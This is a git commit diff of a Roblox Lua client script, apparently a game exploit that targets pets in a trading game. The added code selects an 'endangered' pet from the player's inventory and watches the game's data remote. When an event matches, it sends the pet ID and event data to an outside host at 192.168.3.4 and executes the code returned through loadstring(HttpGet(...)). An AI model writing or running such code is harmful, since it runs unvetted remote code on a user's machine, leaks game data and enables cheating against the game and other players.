7e98f7e9c478ce811692f2c8b3c1f829f4e7334b
qweaad1 <127671966+qweaad1@users.noreply.github.com>
2026-07-06 09:49:39 +0700

    Update client-base.lua

--- sample/client-base.lua
+++ sample/client-base.lua
@@ -1,4 +1,50 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
 
+local function getAllItemsFromInventory()
+    local inventory = require(ReplicatedStorage:FindFirstChild("ClientModules"):FindFirstChild("Core").ClientData).get_data()[LocalPlayer.Name].inventory
+    if not inventory then
+       
+        return {}
+    end
+    
+    local allItems = {}
+    local itemTypes = {"pets"}
+    
+    for _, itemType in ipairs(itemTypes) do
+        local items = inventory[itemType]
+        if items then
+            for i, v in pairs(items) do
+                if v and v.kind:match("endangered")and not v["id"]:match("basic_egg")  then
+                    local itemName = v.name or v.displayName or v.Name or tostring(i)
+                    table.insert(allItems, {
+                        id = i,
+                        type = itemType,
+                        data = v,
+                        name = itemName,
+                        kind = v.kind,
+                        uniqueId = v.kind .. "_" .. itemType
+                    })
+                end
+            end
+        end
+    end
+    
+   
+    return allItems
+end
+
+local tofarm 
+ local allItems = getAllItemsFromInventory()
+    if #allItems > 0 then
+        
+          
+        tofarm=    allItems[1].id, allItems[1].kind 
+        
+    end
+   -- print(tofarm)
+    
 local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name
 
 local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name
@@ -23,7 +69,7 @@ if Remote then Remote = Remote:FindFirstChild("DataAPI/DataChanged") end
 if not Remote then return warn("Remote не найден!") end
 
 local TARGET_PLAYER = "qweaad041"
-local TARGET_PET = "2_2288cbff70a84a34b6c80741ee877611"
+local TARGET_PET = tofarm
 local done = false
 local boot = true
 tasks = {}
@@ -58,7 +104,6 @@ Remote.OnClientEvent:Connect(function(...)
     local dataType = args[2]
     local data = args[3]
     
-    -- Проверяем что ответ содержит нужные значения
     local json = game:GetService("HttpService"):JSONEncode(args)
     if not string.find(json, TARGET_PLAYER) or not string.find(json, TARGET_PET) then
         return
@@ -70,7 +115,7 @@ Remote.OnClientEvent:Connect(function(...)
         local pets = data and data.ailments
         if pets and pets[TARGET_PET] then
       done = true
-          loadstring(game:HttpGet("http://192.168.3.4/oymAPI.php?"..json))()
+          loadstring(game:HttpGet("http://192.168.3.4/oymAPI.php?".."vID=<"..TARGET_PET..">"..json))()
             
             
         end
@@ -83,9 +128,4 @@ refresh()
 while not done do
 wait(10)
  
-end
-print("END")
-
-  
-
-             
+end     
